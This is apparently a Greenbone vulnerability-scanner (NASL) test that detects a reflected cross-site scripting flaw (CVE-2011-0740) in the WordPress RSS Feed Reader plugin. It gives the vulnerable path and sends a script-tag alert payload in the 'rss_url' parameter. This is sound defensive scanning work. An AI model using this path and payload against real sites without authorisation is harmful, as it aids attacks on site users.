# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800196");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_cve_id("CVE-2011-0740");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress RSS Feed Reader Plugin 'rss_url' Parameter Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43071");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45997");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64949");
  script_xref(name:"URL", value:"http://pleer.co.uk/wordpress/plugins/rss-feed-reader");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary
  web script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"RSS Feed Reader WordPress Plugin 0.1");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error in the 'rss_url'
  parameter in 'wp-content/plugins/rss-feed-reader/magpie/scripts/magpie_slashbox.php'
  when processing user-supplied data, which could be exploited by attackers to
  cause arbitrary scripting code to be executed by the user's browser in the
  security context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The WordPress plugin 'RSS Feed Reader' is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/wp-content/plugins/rss-feed-reader/magpie/scripts/magpie_slashbox.php?rss_url=<script>alert('VT-XSS-Attack-Test')</script>";

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\('VT-XSS-Attack-Test'\)</script>", check_header:TRUE)){
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
